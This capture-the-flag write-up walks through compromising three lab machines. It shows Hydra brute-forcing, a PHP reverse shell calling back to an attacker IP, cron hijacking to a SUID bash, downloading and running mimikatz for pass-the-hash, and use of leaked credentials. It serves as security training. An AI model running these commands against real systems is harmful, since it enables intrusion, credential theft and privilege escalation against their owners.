Hacker of the Hill: three boxes, three different footholds

One room, three independent machines at increasing difficulty, each with a completely different way in: a CMS edit page that executes PHP it was never meant to, an Active Directory domain cracked with one weak RDP password, and a leaked session hash that only pays off once you notice the second, easy-to-miss SSH port.

Room: Hacker of the Hill Category: Multi-host / Mixed Tools: Hydra, mimikatz, gobuster, CrackStation

The setup: three separate targets, Easy, Medium, and Hard, each its own box with its own services and its own path to root or SYSTEM. No shared foothold between them, each one gets enumerated from scratch.

No single flag in these notes, each tier's objective is full compromise of that machine.

Easy: a CMS, a PHP sandbox, and a cron job

1
Scan, then brute-force the directory listing

The initial nmap sweep turns up three web apps on adjacent ports:

8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/vbcms
|_http-title: VeryBasicCMS - Home
8001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: My Website
|_Requested resource was /?page=home.php
8002/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Learn PHP
9999/tcp open  abyss?

Port 8000's own robots.txt line already gives away a hidden directory, but gobuster against the root of that port confirms it and finds a couple more paths:

gobuster dir -u http://10.10.84.133:8000 -z -w /usr/share/dirb/wordlists/common.txt -t32

/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/about                (Status: 200) [Size: 1951]
/contact              (Status: 200) [Size: 1955]
/robots.txt           (Status: 200) [Size: 30]
/server-status        (Status: 403) [Size: 279]

robots.txt itself just confirms it: User-agent: * Disallow: /vbcms. Navigating there lands on a login page for "Very Basic CMS."

Why this works

robots.txt is a request not to index a path, not an access control, and nmap's own script output already surfaced it before gobuster even ran. It's one of the most reliable places to find a path an application owner considered sensitive enough to hide from search engines but forgot still needs real authentication.

2
Build a Hydra command from the login's own request

Typing test credentials (admin:pwd) and watching the browser's network tab shows the login is a plain POST with username and password fields to /vbcms/login:

POST http://10.10.84.133:8000/vbcms/login
Form data: username=admin&password=pwd

That's everything Hydra needs:

hydra 10.10.230.235 -s 8000 -f http-post-form "/vbcms/login:username=^USER^&password=^PASS^&from=%2F&Submit=Sign+in:Invalid" -l admin -P /usr/share/dirb/wordlists/big.txt -t24 -v

[8000][http-post-form] host: 10.10.230.235   login: admin   password: admin
1 of 1 target successfully completed, 1 valid password found

admin:admin logs straight into the CMS admin area, which lists three editable pages (Home, About Us, Contact Us).

Why this works

The failed login attempt is doing reconnaissance, not just confirming the creds are wrong. The exact parameter names and the "Invalid" failure string it returns are precisely what a brute-force tool needs to tell a wrong password from a right one.

3
Turn the page editor into a shell

The CMS pages are plain HTML, but the server underneath is Apache executing PHP. Pasting the pentestmonkey PHP reverse shell (pointed at the attack box, $ip = '10.2.57.21'; $port = 4444;) into the Home page's editor and saving it gets it executed on load:

nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.2.57.21] from (UNKNOWN) [10.10.230.235] 33654
$ whoami
serv1
Why this works

A content editor that writes files into a path the web server executes is remote code execution by design, whether or not the application intended "page content" to mean "arbitrary PHP."

4
Spot the pivot you can't take yet

Uploading and running linpeas from the serv1 shell turns up a cron job firing every minute, owned by root, but pointing at a script that belongs to a different user entirely:

* * * * * root /home/serv3/backups/backup.sh
Why this works

A root cron job touching a file some other user owns is a privilege escalation path waiting on one missing piece: control of serv3. Finding it early means the rest of the box is just working out how to reach that specific account.

5
A "learn PHP" tutorial site turns out to execute real PHP

Port 8002 is an interactive "Learn PHP with Adam" tutorial, type code into a box, click Check Code, and it runs server-side. The site's own first lesson already shows the pattern: type echo "Hello World"; and it prints the result back. Testing with raw PHP confirms it executes as a real system user:

<?php system('id'); ?>

Results:
uid=1002(serv3) gid=1002(serv3) groups=1002(serv3)

That's exactly the user the cron job needs. Pasting the same pentestmonkey reverse shell into the box (stripping the leading ?> the site already adds) and submitting it lands a shell directly as serv3, confirmed against the crontab once inside:

nc -lvnp 4444
connect to [10.2.57.21] from (UNKNOWN) [10.10.84.133] 34522
serv3@web-serv:/$ whoami
serv3

serv3@web-serv:/$ cat /etc/crontab
*  *  *  *  *   root /home/serv3/backups/backup.sh
Why this works

Any "try it live" code execution feature is a sandboxed shell by definition, the only open question is how well it's actually sandboxed. Here, not well at all: it ran as a real, useful system user rather than a throwaway container account.

6
Hijack the cron job for root

As serv3, the cron-executed script is readable but starts out read-only, so it needs a permissions bump before it can be rewritten to set the SUID bit on bash:

serv3@web-serv:/home/serv3/backups$ ls -la backup.sh
-r-xr-xr-x 1 serv3 serv3 52 Feb 15 01:02 backup.sh

serv3@web-serv:/home/serv3/backups$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash

serv3@web-serv:/home/serv3/backups$ echo "chmod 4777 /bin/bash" > backup.sh
bash: backup.sh: Permission denied

serv3@web-serv:/home/serv3/backups$ chmod 777 backup.sh
serv3@web-serv:/home/serv3/backups$ echo "chmod 4777 /bin/bash" > backup.sh

One minute later the cron fires as root and the SUID bit lands:

-rwsrwxrwx 1 root root 1113504 Jun  6  2019 /bin/bash

serv3@web-serv:/home/serv3/backups$ /bin/bash -p
bash-5.0# whoami
root
Why this works

A cron job is just code that runs with someone else's privileges on a timer. If an attacker can edit what it runs, they've effectively scheduled their own command to execute as root, no exploit required beyond file permissions.

Medium: Active Directory, a weak RDP password, and pass-the-hash

1
Enumerate the domain and its users

Open ports name the domain controller outright:

80, 81, 82
88 kerberos
135 RPC
139 netbios-ssn
389 AD LDAP Domain: troy.thm0.
445 ms-ds
464 kpasswd5
636
3268 AD LDAP Domain: troy.thm0.
3269
3389 rdp TROY-DC  DNS_Computer_Name: TROY-DC.troy.thm  Version: 10.0.17763

Users: Achilles, Agamemnon, Hector, Helen, Patrocles, Administrator
Why this works

Kerberos plus LDAP together is as close to a neon sign reading "Active Directory" as a port scan gets, and once the domain's confirmed, user enumeration is usually the cheapest next move.

2
Confirm the flags exist with a filesystem search, then brute-force RDP

A recursive filename search finds every user's desktop flag at once, useful as a sanity check that an account is actually reachable:

C:\>dir flag.txt /s /p

Directory of C:\Users\achilles\Desktop
19/02/2021  19:52    37 flag.txt

Directory of C:\Users\Administrator\Desktop
21/02/2021  20:45    37 flag.txt

Rather than guess which account is weak, Hydra sprays one user's RDP login with a common wordlist:

hydra rdp://10.10.20.81 -f -l achilles -P /usr/share/wordlists/rockyou.txt -t4

[3389][rdp] host: 10.10.52.251   login: achilles   password: winniethepooh
1 of 1 target successfully completed, 1 valid password found
Why this works

In a domain with several human user accounts, only one needs a weak, wordlist-guessable password for the whole enumeration effort to pay off, and RDP rarely has the same lockout tuning a web login does.

3
Pass-the-hash to Administrator with mimikatz

Inside via RDP as achilles, pulling mimikatz onto the box and running three commands in sequence, elevate the token, dump local SAM secrets, then pass Administrator's NTLM hash directly, authenticates without ever needing the plaintext password:

Invoke-WebRequest -Uri "http://10.2.57.21:8000/mimikatz.exe" -OutFile "C:\users\mimikatz.exe"
.\mimikatz.exe

mimikatz # token::elevate
mimikatz # lsadump::sam sam3.reg system.reg
mimikatz # sekurlsa::pth /user:Administrator /domain:TROY-DC /ntlm:8c1c8cc0c8c9b77d17df57acc34b08aa

That drops into an impersonated session as Administrator:

C:\Windows\system32>whoami
nt authority\system
Why this works

Once an NTLM hash is recovered, Windows authentication accepts it in place of a password. One weak RDP credential was the only thing standing between an external attacker and a path straight to SYSTEM.

Hard: a leaked session hash and a second SSH port

1
Map a wide, mismatched set of services
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp   open  http     Apache 2.4.41 (Ubuntu)
|_http-title: Server Manager Login
81/tcp   open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Home Page
82/tcp   open  http     Apache 2.4.41 (Ubuntu)
|_http-title: I Love Hills - Home
2222/tcp open  ssh      OpenSSH 8.2p1 Ubuntu
8888/tcp open  http     Werkzeug httpd 0.16.0 (Python 3.8.5)
9999/tcp open  abyss?
Why this works

Seven open ports across two SSH services and three web servers means the real way in is probably not the first thing that loads. Every service here needs its own look before deciding which one matters.

2
Find an API that leaks its own session hash
gobuster dir -u http://10.10.18.59/api/user -s 80 -w /usr/share/dirb/wordlists/common.txt -t32

/login     (Status: 200) [Size: 53]
/session   (Status: 200) [Size: 91]

Querying the session endpoint directly, no authentication needed, returns an active admin session:

GET /api/user/session

{
  "active_sessions": {
    "0": {
      "id": 1,
      "username": "admin",
      "hash": "1b4237f476826986da63022a76c35bb1"
    }
  }
}

CrackStation cracks it instantly, it's a well-known precomputed hash:

Hash: 1b4237f476826986da63022a76c35bb1
Type: md5
Result: dQw4w9WgXcQ
Why this works

An endpoint that returns session data without checking whether the caller is authorized to see it is an authorization bug, the request itself needs no credentials to leak someone else's. Any hash common enough to be precomputed in a public rainbow table might as well be plaintext (and this particular result is a well-known joke string, worth a laugh once it's recognized).

3
Pull plaintext credentials from a second, separate app

The Werkzeug app on port 8888 is a simple application launcher with its own API, self-documenting on the root path:

curl http://10.10.18.59:8888
Welcome to CMNatic's Application Launcher! You can launch applications by
enumerating the /apps/ endpoint.

curl http://10.10.18.59:8888/apps
{"app1": {"name": "online file storage"}, "app2": {"name": "media player"},
 "app3": {"name": "file sync"}, "app4": {"name": "/users"}}

Following app4's hint straight to /users:

curl http://10.10.18.59:8888/users
{"user": {"davelarkin": "totallysecurehuh"}}
Why this works

Internal-looking admin tools often assume no one outside the team will ever enumerate their API surface, so "harmless" endpoints like a user directory ship with no authentication at all.

4
The obvious SSH port is a dead end, the second one isn't
ssh davelarkin@10.10.18.59
davelarkin@10.10.18.59: Permission denied (publickey).

Port 22 is key-only. The second SSH service on 2222 isn't:

ssh -p 2222 davelarkin@10.10.18.59
davelarkin@10.10.18.59's password: totallysecurehuh

Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1037-aws x86_64)
Why this works

Running two SSH daemons with different auth policies on the same host is a common, often accidental misconfiguration: a hardened service on the expected port next to a forgotten, more permissive one on an alternate port. Credentials that fail against the obvious target are worth retrying against every other instance of the same service.

Takeaways

Content editors are RCE if the server executes what they write

Both Easy-box footholds came from the same pattern: a feature designed to let users submit content, running on a server that doesn't distinguish "content" from "code."

One weak password anywhere undoes the rest of the hardening

The Medium box's entire chain, up to a SYSTEM shell, traced back to a single RDP account with a wordlist-guessable password.

The forgotten second instance of a service is often the real door

A second SSH daemon on a nonstandard port, with looser auth, undid whatever hardening the "real" SSH port had. Enumerate every instance of a service, not just the expected one.
